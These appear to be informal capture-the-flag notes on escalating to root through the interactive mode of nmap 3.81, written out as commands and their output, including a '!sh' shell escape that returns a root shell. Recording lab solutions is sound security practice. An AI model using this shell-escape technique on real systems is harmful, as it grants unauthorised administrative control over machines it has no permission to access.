for key 3 its difficult and blindly following the walkthrough results in previlage escalation in nmap version 3.81
https://vk9-sec.com/nmap-privilege-escalation/

nmap --interactive
 -> runs the nmap with higher previlage [previlage escalation]
 -> in an interactive mode if "!bash" is typed in, then the shell gets opened with the previlage of the interacting software.
 -> This results in higher previlage shell out.
 -> if !bash is typed in
 	results, a current user owned bash shell
 -> if !sudo /bin/bash is typed in,
 	results in
 		nmap> !sudo /bin/bash
		!sudo /bin/bash
		[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

		robot is not in the sudoers file.  This incident will be reported.

robot is not in the sudoers file.

however, we are able to invoke a shell and try
 
 -> !sh [this is a root shell by default].
 	this resulted in ,
 	nmap> !sh
	!sh
	# whoami
	whoami	
	root
